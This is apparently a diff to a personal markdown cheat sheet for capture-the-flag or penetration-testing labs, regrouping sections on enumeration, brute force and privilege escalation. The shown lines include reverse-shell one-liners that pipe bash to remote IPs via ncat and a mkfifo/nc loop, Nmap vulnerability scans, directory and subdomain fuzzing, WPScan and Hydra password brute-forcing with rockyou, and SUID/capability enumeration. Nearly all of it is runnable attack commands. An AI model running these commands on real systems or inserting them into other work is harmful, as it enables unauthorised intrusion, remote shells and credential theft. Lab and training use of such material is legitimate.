@@ -6,14 +6,58 @@ ncat 10.11.99.141 5555 -e bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.14.85.242 9001 >/tmp/f
 ```
 ### [Other_Reverse_Shell_Site](https://www.revshells.com/)
-# Nmap_enumeration ✅
+
+# Enumeration ✅📚
+## Nmap_Enumeration ✅
 ```bash
 sudo nmap -p- <ip> -sV -T5
 sudo nmap -p- <ip> -sV -T5 -Pn
 sudo nmap 139,445 <ip> -sV -T5 --script=vuln
 sudo nmap -p 139,445 <ip> -sV -T5 --script=vuln -Pn
 ```
-# SUID_SGID_Capabilities_Files_enumeration ✅
+## WEB_Enumeration ✅
+### *subdomains_enumeration ✡️
+```bash
+gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt —append-domain -t 100 --no-error 
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host:FUZZ.example.com" -fw 6
+wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
+```
+### *directory _enumeration ✡️
+```bash
+nikto -h http://example.com
+
+dirb http://example.com
+dirb http://example.com -X .php,.html,.bak,.log,.txt,.zip,.enc
+
+gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html,.bak,.log,.txt,.zip,.enc
+
+ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fc 500,404
+ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php,.html,.bak,.log,.txt,.zip,.enc
+
+wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404,500 http://example.com/FUZZ
+```
+### *Wpscan ✡️
+```bash
+wpscan --url http://<adress>/ -e u (enum user)
+wpscan --url http://<adress>/ -e ap (plugin)
+wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
+```
+
+# Brute Force Attack ✅📚
+## Hydra Attack Type Cheat Sheet ✅
+```bash
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
+```
+### *Get Method Brute Force ✅
+```bash
+nikto -h http://10.10.131.147:1234/manager/html -id bob:<password>
+hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.176.108 -s 80 http-get /protected/ -I
+```
+# Privilege-Escalation ✅📚
+## SUID_SGID_Capabilities_Files_enumeration ✅
 ```
 getcap -r / 2>/dev/null 
 find /  -perm -04000 -ls 2>/dev/null
@@ -49,39 +93,8 @@ select * from <table>;
 
 SELECT * FROM <table_name> WHERE <column_name> LIKE '%search_string%';
 ```
-# Hydra Attack Type Cheat Sheet ✅
-```bash
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -vV <ip> ftp
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-get /protected/ -I
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f <ip> -s 80 http-post-form "/<dir>:username=^USER^&password=^PASS^:<Faild Error>" -vV -I
-```
-# WEB ✅
-## *subdomains_enumeration ✡️
-```bash
-gobuster vhost -u http://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt —append-domain -t 100 --no-error 
-ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host:FUZZ.example.com" -fw 6
-wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.example.com" -u http://example.com -t 100
-```
-## *directory _enumeration ✡️
-nikto -h http://example.com
 
-dirb http://example.com
-dirb http://example.com -X .php,.html,.bak,.log,.txt,.zip,.enc
 
-gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
-gobuster dir -u http://example.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html,.bak,.log,.txt,.zip,.enc
-
-ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -fc 500,404
-ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e .php,.html,.bak,.log,.txt,.zip,.enc
-
-wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404,500 http://example.com/FUZZ
-*Wpscan ✡️
-wpscan --url http://<adress>/ -e u (enum user)
-wpscan --url http://<adress>/ -e ap (plugin)
-wpscan --url http://<adress>/ --usernames <user> --passwords /usr/share/wordlists/rockyou.txt
-*Get Method Brute Force ✡️
-nikto -h http://10.10.131.147:1234/manager/html -id bob:<password>
-hydra -t 4 -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.176.108 -s 80 http-get /protected/ -I
 ———————————————
 gpg command cheetsheet ✅
 gpg --import key.gpg
